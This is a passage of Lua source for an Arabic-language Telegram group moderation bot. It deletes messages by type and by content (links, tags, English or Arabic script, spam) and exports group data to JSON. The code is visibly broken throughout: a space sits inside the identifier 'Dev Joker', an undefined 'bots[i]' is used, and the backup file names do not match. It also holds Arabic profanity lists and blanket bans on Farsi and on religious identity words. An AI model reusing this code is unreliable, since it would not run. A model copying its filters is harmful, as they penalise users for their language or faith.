if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Dev Joker..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Audio]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Dev Joker..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Dev Joker..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Audio]")
end
end
end
end
--     Source Joker     --
--         Voice          --
elseif msg_type == 'MSG:Voice' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(Dev Joker..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(Dev Joker..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Voice]")
end
end
end
if DevAbs:get(Dev Joker..'bot:voice:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Voice]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(Dev Joker..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Voice]")
end
end
if DevAbs:get(Dev Joker..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Voice]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Dev Joker..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Voice]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Dev Joker..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Voice]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Dev Joker..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Dev Joker..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Voice]")
end
end
end
end
--     Source Joker     --
--        Location        --
elseif msg_type == 'MSG:Location' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(Dev Joker..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(Dev Joker..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end
end
end
if DevAbs:get(Dev Joker..'bot:location:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Location]")
return
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(Dev Joker..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Location]")
end
end
if DevAbs:get(Dev Joker..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Location]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Dev Joker..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Location]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Dev Joker..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Location]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Dev Joker..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Location]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Dev Joker..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end
end
end
end
--     Source Joker     --
--         Video          --
elseif msg_type == 'MSG:Video' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(Dev Joker..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(Dev Joker..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Video]")
end
end
end
if DevAbs:get(Dev Joker..'bot:video:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Video]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(Dev Joker..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Video]")
end
end
if DevAbs:get(Dev Joker..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Video]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Dev Joker..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Video]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Dev Joker..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Video] ")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Dev Joker..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Video] ")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Dev Joker..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Video]")
end
end
end
end
--     Source Joker     --
--          Gif           --
elseif msg_type == 'MSG:Gif' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(Dev Joker..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(Dev Joker..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Gif]")
end
end
end
if DevAbs:get(Dev Joker..'bot:gifs:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Gif]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(Dev Joker..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Gif] ")
end
end
if DevAbs:get(Dev Joker..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Gif]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Dev Joker..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Gif]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") then
if DevAbs:get(Dev Joker..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Gif]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Dev Joker..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Gif]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Dev Joker..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Gif]")
end
end
end
end
--     Source Joker     --
--         Text           --
elseif msg_type == 'MSG:Text' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(Dev Joker..pm, TIME_CHECK, msgs+1)
end
end
--vardump(msg)
if DevAbs:get(Dev Joker.."bot:group:link"..msg.chat_id_) == 'waiting' then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local abs = "bot:group:link"..msg.chat_id_
DevAbs:set(Dev Joker..abs,glink)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم صنع الرابط الجديد\n⌁︙ارسل (الرابط) لعرض الرابط', 1, 'md')
end
end
function check_username(extra,result,success)
--vardump(result)
local username = (result.username_ or '')
local svuser = 'user:'..result.id_
if username then
DevAbs:hset(svuser, 'username', username)
end
if username and username:match("[Bb][Oo][Tt]$") or username:match("_[Bb][Oo][Tt]$") then
if DevAbs:get(Dev Joker..'bot:bots:gkgk'..msg.chat_id_) and not is_admin(msg.chat_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
else
chat_kick(msg.chat_id_, bots[i].user_id_)
return false
end
end
end
getUser(msg.sender_user_id_,check_username)
DevAbs:set(Dev Joker..'bot:editid'.. msg.id_,msg.content_.text_)
if not is_free(msg, msg.content_.text_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
check_filter_words(msg,text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if DevAbs:get(Dev Joker..'bot:links:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link]")
end
end
if DevAbs:get(Dev Joker..'bot:text:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Text]")
end
if msg.forward_info_ then
if DevAbs:get(Dev Joker..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Text]")
end
end
end
if msg.content_.text_:match("@") then
if DevAbs:get(Dev Joker..'tags:lock'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Text]")
end
end
if msg.content_.text_:match("#") then
if DevAbs:get(Dev Joker..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Text]")
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Dev Joker..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Text]")
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Dev Joker..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Text]")
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
local abs = 'bot:sens:spam'..msg.chat_id_
if not DevAbs:get(Dev Joker..abs) then
sens = 400
else
sens = tonumber(DevAbs:get(Dev Joker..abs))
end
if DevAbs:get(Dev Joker..'bot:spam:mute'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
delete_msg(chat,msgs)
print("Deleted [Lock] [Spam] ")
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevAbs:get(Dev Joker..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Text]")
end
end
end
end
--     Source Joker     --
local msg = data.message_
text = msg.content_.text_
if text and is_monshid(msg.sender_user_id_, msg.chat_id_) then 
if DevAbs:get('ABS_PROX:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbs:del('ABS_PROX:'..bot_id..'id:user'..msg.chat_id_)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
DevAbs:del('ABS_PROX:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevAbs:del('ABS_PROX:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbs:get('ABS_PROX:'..bot_id..'id:user'..msg.chat_id_)  
DevAbs:incrby('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..iduserr,numadded)  
Dev_Abs(msg.chat_id_, msg.id_,  1, "⌁︙تم اضافة "..numadded..' رساله', 1, 'md')
end
end

if text and is_monshid(msg.sender_user_id_, msg.chat_id_) then 
if DevAbs:get('ABS_PROX:'..bot_id.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbs:del('ABS_PROX:'..bot_id..'ids:user'..msg.chat_id_)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
DevAbs:del('ABS_PROX:'..bot_id.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevAbs:del('ABS_PROX:'..bot_id.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbs:get('ABS_PROX:'..bot_id..'ids:user'..msg.chat_id_)  
DevAbs:incrby(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,numadded)  
Dev_Abs(msg.chat_id_, msg.id_,  1, "⌁︙تم اضافة "..numadded..' نقطه', 1, 'md')
end
end
--     Source Joker     --
if text:match("طيز") or text:match("ديس") or text:match("كس") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("صرم") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") then
if not DevAbs:get(Dev Joker.."fshar"..msg.chat_id_) and not is_admin(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '⌁︙عذرا عزيزي ↫ [firstname](https://telegram.me/username) \n⌁︙ممنوع الفشار في المجموعة'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'BLACK_TEAM_4'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     Source Joker     --
if text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") then
if DevAbs:get(Dev Joker.."farsi"..msg.chat_id_) and not is_admin(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '⌁︙عذرا عزيزي ↫ [firstname](https://telegram.me/username) \n⌁︙ممنوع التكلم بالغة الفارسية هنا'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'BLACK_TEAM_4'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
if text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") then
if DevAbs:get(Dev Joker.."farsiban"..msg.chat_id_) and not is_admin(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end end 
--     Source Joker     --
if text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله") then
if not DevAbs:get(Dev Joker.."kaf"..msg.chat_id_) and not is_admin(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '⌁︙عذرا عزيزي ↫ [firstname](https://telegram.me/username) \n⌁︙ممنوع الكفر في المجموعة'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'BLACK_TEAM_4'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     Source Joker     --
if text:match("شيعي نكس") or text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("طائفيه") or text:match("انا سني") or text:match("انا شيعي") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("بالشيعه") or text:match("شيعة") then
if not DevAbs:get(Dev Joker.."taf"..msg.chat_id_) and not is_admin(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '⌁︙عذرا عزيزي ↫ [firstname](https://telegram.me/username) \n⌁︙ممنوع التكلم بالطائفية هنا'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'BLACK_TEAM_4'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     Source Joker     --
if is_leader(msg) then
if text == 'جلب نسخه المجموعات' or text == 'جلب نسخه البوت' or text == 'جلب نسخه احتياطيه' then
local list = DevAbs:smembers(Dev Joker..'bot:groups')  
local t = '{"BOT_ID": '..Dev Joker..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = title_name(v) or ''
NAME = NAME:gsub('"','')
NAME = NAME:gsub('#','')
NAME = NAME:gsub([[\]],'')
link = DevAbs:get(Dev Joker.."bot:group:link"..v) or ''
welcome = DevAbs:get(Dev Joker..'welcome:'..v) or ''
ABSMNSH = DevAbs:smembers(Dev Joker..'abs:absmonsh:'..v)
MNSH = DevAbs:smembers(Dev Joker..'abs:monsh:'..v)
MNSHID = DevAbs:smembers(Dev Joker..'abs:monshid:'..v)
MDER = DevAbs:smembers(Dev Joker..'abs:owners:'..v)
MOD = DevAbs:smembers(Dev Joker..'abs:admins:'..v)
VIP = DevAbs:smembers(Dev Joker..'abs:vipmem:'..v)
if k == 1 then
t = t..'"'..v..'":{"GP_NAME":"'..NAME..'",'
else
t = t..',"'..v..'":{"GP_NAME":"'..NAME..'",'
end

if #VIP ~= 0 then 
t = t..'"VIP":['
for k,v in pairs(VIP) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSHID ~= 0 then
t = t..'"MNSHID":['
for k,v in pairs(MNSHID) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #ABSMNSH ~= 0 then
t = t..'"ABSMNSH":['
for k,v in pairs(ABSMNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}'
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..Dev Joker..'.json', '⌁︙عدد كروبات البوت : ('..#list..')',dl_cb, nil)
end
if text == 'رفع النسخه' and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
add_file(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
--     Source Joker     --
if text and text:match("منو ضافني") then
